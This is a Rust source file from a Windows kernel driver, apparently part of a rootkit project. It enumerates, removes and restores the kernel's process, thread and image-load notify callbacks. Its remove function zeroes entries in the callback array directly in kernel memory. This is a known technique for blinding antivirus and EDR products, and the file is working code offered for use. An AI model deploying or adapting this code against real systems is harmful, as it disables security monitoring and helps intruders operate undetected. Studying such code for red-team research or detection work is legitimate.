use {
    alloc::vec::Vec,
    spin::{Lazy, Mutex},
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
    wdk_sys::{NTSTATUS, STATUS_SUCCESS},
};

use {
    common::{
        enums::Callbacks,
        structs::CallbackInfoOutput
    },
    crate::{
        error::ShadowError,
        utils::list_modules,
        data::CallbackRestaure,
        callback::find_callback::{
            find_callback_address, CallbackResult
        }, 
    },
};

/// Structure that manages callbacks in the system.
///
/// The `Callback` structure provides functionality to remove, restore, and enumerate
/// system callbacks like `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, 
/// and `PsSetLoadImageNotifyRoutine`.
pub struct Callback;

const MAX_CALLBACK: usize = 100;

/// Stores information about removed callbacks.
///
/// This static variable holds a list of callbacks that were removed and are protected by a `Mutex`
/// to ensure thread-safe access. It is initialized with a capacity of `MAX_CALLBACK`.
pub static mut INFO_CALLBACK_RESTAURE_NOTIFY: Lazy<Mutex<Vec<CallbackRestaure>>> = Lazy::new(|| 
    Mutex::new(Vec::with_capacity(MAX_CALLBACK))
);

impl Callback {
    /// Restores a previously removed callback by its index.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to be restored (e.g., process, thread, registry).
    /// * `index` - The index of the callback to restore.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - A success state if the callback is successfully restored.
    /// * `Err(ShadowError)` - A specific error if the callback cannot be restored.
    pub unsafe fn restore(callback: Callbacks, index: usize) -> Result<NTSTATUS, ShadowError> {
        // Lock the removed callbacks to ensure thread-safe access
        let mut callbacks = INFO_CALLBACK_RESTAURE_NOTIFY.lock();

        // Find the removed callback by its index
        let index = callbacks
            .iter()
            .position(|c| c.callback == callback && c.index == index)
            .ok_or(ShadowError::IndexNotFound(index))?;

        // Retrieve the callback address based on the callback type
        let address = match find_callback_address(&callback)? {
            CallbackResult::Notify(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound),
        };

        // Restore the callback by writing back its address
        let addr = address.offset((callbacks[index].index * 8) as isize);
        *(addr as *mut u64) = callbacks[index].address;

        // Remove the restored callback from the saved list
        callbacks.remove(index);

        Ok(STATUS_SUCCESS)
    }

    /// Removes a callback from a notification routine.
    ///
    /// This function removes a callback by setting its address in the callback table to `0`
    /// and stores the removed callback's information in `INFO_CALLBACK_RESTAURE_NOTIFY` for
    /// future restoration.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to remove.
    /// * `index` - The index of the callback to remove.
    ///
    /// # Returns
    ///
    /// * `Ok(STATUS_SUCCESS)` - if the callback is successfully removed.
    /// * `Err(ShadowError)` - if the callback address cannot be found.
    pub unsafe fn remove(callback: Callbacks, index: usize) -> Result<NTSTATUS, ShadowError> {
        // Retrieve the callback address based on the callback type
        let address = match find_callback_address(&callback)? {
            CallbackResult::Notify(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound),
        };

        // Calculate the callback address to be removed
        let addr = address.offset((index as isize) * 8);

        // Save the removed callback information
        let callback = CallbackRestaure {
            index,
            callback,
            address: *(addr as *mut u64),
        };

        let mut callback_info = INFO_CALLBACK_RESTAURE_NOTIFY.lock();
        callback_info.push(callback);

        // Remove the callback by setting its address to 0
        *(addr as *mut u64) = 0;

        Ok(STATUS_SUCCESS)
    }
}

/// Methods related to callback enumeration
impl Callback {
    /// Enumerates the modules associated with callbacks and populates callback information.
    ///
    /// This function iterates through the system's callback table and identifies the modules
    /// that have registered callbacks. It stores this information in the `callback_info` structure.
    ///
    /// # Arguments
    ///
    /// * `callback` - The type of callback to enumerate.
    ///
    /// # Returns
    ///
    /// * `Ok(Vec<CallbackInfoOutput>)` - containing the list of callbacks.
    /// * `Err(ShadowError)` - if the callback cannot be found.
    pub unsafe fn enumerate(callback: Callbacks) -> Result<Vec<CallbackInfoOutput>, ShadowError> {
        let mut callbacks: Vec<CallbackInfoOutput> = Vec::new();

        // Get the address of the callback from the system
        let address = match find_callback_address(&callback)? {
            CallbackResult::Notify(addr) => addr,
            _ => return Err(ShadowError::CallbackNotFound),
        };

        // Iterate over loaded modules to find the module corresponding to each callback
        let (mut ldr_data, module_count) = list_modules()?;
        let start_entry = ldr_data;

        for i in 0..64 {
            let addr = address.cast::<u8>().offset(i * 8);
            let callback = *(addr as *const u64);

            if callback == 0 {
                continue;
            }

            // Iterate through the loaded modules to find the one associated with the callback
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let image_size = (*ldr_data).SizeOfImage;
                let end_address = start_address as u64 + image_size as u64;
                let raw_pointer = *((callback & 0xfffffffffffffff8) as *const u64);
    
                // Check if the callback addresses fall within the module's memory range
                if raw_pointer > start_address as u64 && raw_pointer < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
    
                    // Store the callback information
                    let mut name = [0u16; 256];
                    let length = core::cmp::min(buffer.len(), 255);
                    name[..length].copy_from_slice(&buffer[..length]);

                    callbacks.push(CallbackInfoOutput {
                        index: i as u8,
                        address: raw_pointer as usize,
                        name,
                        ..Default::default()
                    });

                    break;
                }

                // Move to the next module
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset the module list pointer for the next callback
            ldr_data = start_entry;
        }

        Ok(callbacks)
    }
    
    /// Enumerates all removed callbacks and provides detailed information.
    ///
    /// # Returns
    ///
    /// * `Ok(Vec<CallbackInfoOutput>)` - containing the list of removed callbacks.
    /// * `Err(ShadowError)` - if the operation fails.
    pub unsafe fn enumerate_removed() -> Result<Vec<CallbackInfoOutput>, ShadowError> {
        let mut callbacks: Vec<CallbackInfoOutput> = Vec::new();

        let callbacks_removed = INFO_CALLBACK_RESTAURE_NOTIFY.lock();
        let (mut ldr_data, module_count) = list_modules()?;
        let start_entry = ldr_data;

        // Iterate over the removed callbacks
        for (i, callback) in callbacks_removed.iter().enumerate() {
            for _ in 0..module_count {
                let start_address = (*ldr_data).DllBase;
                let end_address = start_address as u64 + (*ldr_data).SizeOfImage as u64;
                let raw_pointer = *((callback.address & 0xfffffffffffffff8) as *const u64);

                // Check if the callback addresses fall within the module's memory range
                if raw_pointer > start_address as u64 && raw_pointer < end_address {
                    let buffer = core::slice::from_raw_parts(
                        (*ldr_data).BaseDllName.Buffer,
                        ((*ldr_data).BaseDllName.Length / 2) as usize,
                    );
                    
                    // Store the callback information
                    let mut name = [0u16; 256];
                    let length = core::cmp::min(buffer.len(), 255);
                    name[..length].copy_from_slice(&buffer[..length]);

                    callbacks.push(CallbackInfoOutput {
                        index: callback.index as u8,
                        address: callback.address as usize,
                        name,
                        ..Default::default()
                    });
                    
                    break;
                }         

                // Move to the next module
                ldr_data = (*ldr_data).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
            }

            // Reset the module list pointer for the next callback
            ldr_data = start_entry;
        }

        Ok(callbacks)
    }
}